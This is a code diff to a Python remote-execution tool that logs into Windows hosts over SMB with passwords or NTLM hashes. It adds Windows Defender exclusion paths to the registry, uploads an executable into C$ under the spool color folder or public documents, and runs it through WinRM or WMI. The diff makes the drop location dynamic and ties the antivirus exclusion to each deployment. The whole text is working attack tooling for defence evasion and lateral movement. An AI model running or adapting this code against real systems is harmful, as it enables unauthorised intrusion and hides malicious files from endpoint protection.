@@ -36,14 +36,14 @@ def valueExistOnReg(netCommand, protocol, shellID, iWbemServices, base, value) -
         retVal = classObject.GetStringValue(2147483650, '{base}\{value}'.format(base=base, value=value), 'ImagePath')
         return retVal.ReturnValue == 2
 
-def deployDefenderException(protocol, shellID, classObject, iWbemServices, netCommand) -> None:
+def deployDefenderException(protocol, shellID, classObject, iWbemServices, netCommand, remoteFilePath) -> None:
     if(not valueExistOnReg(netCommand, protocol, shellID, iWbemServices, "SOFTWARE\Policies\Microsoft\Windows Defender", "Exclusions")):
         addRegValue(netCommand, protocol, shellID, classObject, "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "Exclusions", "regkey")
 
     if(not valueExistOnReg(netCommand, protocol, shellID, iWbemServices, "SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions", "Paths")):
         addRegValue(netCommand, protocol, shellID, classObject, "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions", "Paths", "regkey")
     
-    addRegValue(netCommand, protocol, shellID, classObject, "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths", "C:\windows\system32\spool\drivers\color", "entry")
+    addRegValue(netCommand, protocol, shellID, classObject, "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths", "{remoteFilePath}".format(remoteFilePath = remoteFilePath), "entry")
 
 def getAddressInterface(interface) -> str:
     command = "ifconfig {} | grep 'inet ' | awk '{{print $2}}'".format(interface)
@@ -51,7 +51,15 @@ def getAddressInterface(interface) -> str:
 
     return process.stdout.strip()
 
-def isExecutableDeployed(conn, share, remoteFilePath) -> bool:
+def getAvailaibleExecutablePath(conn, share) -> str:
+    remoteFirstOptionFilePath = "windows\system32\spool\drivers\color\Photo.gmmp"
+
+    if(pathExist(conn, share, remoteFirstOptionFilePath)):
+        return "windows\system32\spool\drivers\color"
+    else:
+        return "users\public\documents"
+
+def pathExist(conn, share, remoteFilePath) -> bool:
     try:
         tid = conn.connectTree(share)
         fid = conn.openFile(tid, remoteFilePath)
@@ -61,28 +69,33 @@ def isExecutableDeployed(conn, share, remoteFilePath) -> bool:
     except:
         return False
 
-def deployExecutable(netCommand,remote_auth) -> bool:
+def deployExecutable(netCommand,remote_auth, protocol, shellID, classObject, iWbemServices) -> tuple:
     if(netCommand._command != "netsh"):
         password, lmhash, nthash = remote_auth.retrieveAuthMethodCreds()
 
         conn = SMBConnection(netCommand._srcaddr, netCommand._srcaddr, sess_port=445)
         conn.login(remote_auth.getUsername(), password, remote_auth.getDomain(), lmhash, nthash)
 
-        exePath="executables/{commnad}.exe".format(commnad = netCommand._command)
         share = "C$"
-        remoteFilePath = "windows\system32\spool\drivers\color\{command}.exe".format(command=netCommand._command)
-        
-        if(not isExecutableDeployed(conn, share, remoteFilePath)):
+        exePath="./executables/{commnad}.exe".format(commnad = netCommand._command)
+
+        remotePath = getAvailaibleExecutablePath(conn, share)
+        remoteFilePath = "{remotePath}\{command}.exe".format(remotePath = remotePath, command = netCommand._command)
+
+        deployDefenderException(protocol, shellID, classObject, iWbemServices, netCommand, remotePath)
+        sleep(5)
+
+        if(not pathExist(conn, share, remoteFilePath)):
             executable = open(exePath, 'rb')
             conn.putFile(share, remoteFilePath, executable.read)  
             executable.close()
 
-        deployed = isExecutableDeployed(conn,share,remoteFilePath) 
+        deployed = pathExist(conn,share,remoteFilePath) 
 
         conn.logoff()
-        return deployed
+        return deployed, remoteFilePath
     else:
-        return True
+        return True, None
     
 def getCommandline(netCommand) -> str:
     commandline = ""
@@ -102,16 +115,14 @@ def winrmConnection(netCommand,remote_auth) -> tuple:
     protocol = winrm.Protocol(endpoint='http://{host}:5985/wsman'.format(host=remote_auth.getHost()),transport='ntlm',username=r'{domain}\{user}'.format(domain=remote_auth.getDomain(),user=remote_auth.getUsername()),password=remote_auth.getPassword(),server_cert_validation='ignore')
     shellID = protocol.open_shell()
 
-    deployDefenderException(protocol, shellID, None, None, netCommand)
-    success = deployExecutable(netCommand,remote_auth)
-
+    success, remoteFilePath = deployExecutable(netCommand,remote_auth,protocol, shellID, None, None)
     if(success):
         commandID = ""
         commandline = getCommandline(netCommand)
         if(netCommand._command == "netsh"):
             commandID = protocol.run_command(shellID,"cmd /Q /c {commandline}".format(commandline = commandline))
-        else:
-            commandID = protocol.run_command(shellID,"cmd /Q /c C:\windows\system32\spool\drivers\color\{command}.exe {commandline}".format(command = netCommand._command, commandline = commandline))
+        else:   
+            commandID = protocol.run_command(shellID,"cmd /Q /c C:\{remoteFilePath} {commandline}".format(remoteFilePath = remoteFilePath, commandline = commandline))
         return shellID,commandID 
     else:
         return None,None
@@ -125,10 +136,8 @@ def wmiConnection(netCommand, remote_auth) -> tuple:
     iWbemServices = iWbemLevel1Login.NTLMLogin('//{machine}/root/cimv2'.format(machine=remote_auth.getHost()), NULL, NULL)
 
     classObject,_ = iWbemServices.GetObject('Win32_Process')
-    deployDefenderException(None, None, classObject, iWbemServices, netCommand)
-    sleep(5)
-
-    success = deployExecutable(netCommand,remote_auth)   
+    success, remoteFilePath = deployExecutable(netCommand,remote_auth,None, None, classObject, iWbemServices)  
+    
     if(success):
         obj, commandID, shellID = "", "", ""
         commandline = getCommandline(netCommand)
@@ -136,7 +145,7 @@ def wmiConnection(netCommand, remote_auth) -> tuple:
             obj = classObject.Create('cmd.exe /Q /c {commandline}'.format(commandline=commandline), 'c:\\', None)
             shellID, commandID = 2211, 2211
         else:
-            obj = classObject.Create('cmd.exe /Q /c C:\\Windows\\system32\\spool\\drivers\\color\\{command}.exe {commandline}'.format(command=netCommand._command, commandline=commandline), 'c:\\', None)
+            obj = classObject.Create('cmd.exe /Q /c C:\\{remoteFilePath}\\{command}.exe {commandline}'.format(remoteFilePath=remoteFilePath.replace("\\","\\\\"), command=netCommand._command, commandline=commandline), 'c:\\', None)
             sleep(8)
             iEnumWbemClassObject = iWbemServices.ExecQuery('SELECT * FROM Win32_Process WHERE Name="{command}.exe" AND CommandLine LIKE "%{commandline}%"'.format(command=netCommand._command,commandline=commandline))
             sleep(8)
@@ -160,5 +169,6 @@ if __name__ == "__main__":
         shellID,commandID = winrmConnection(netCommand,remote_auth)
     elif(netCommand._protocol == "wmi"):
         shellID,commandID = wmiConnection(netCommand,remote_auth)
+
 
     print(shellID+","+commandID)
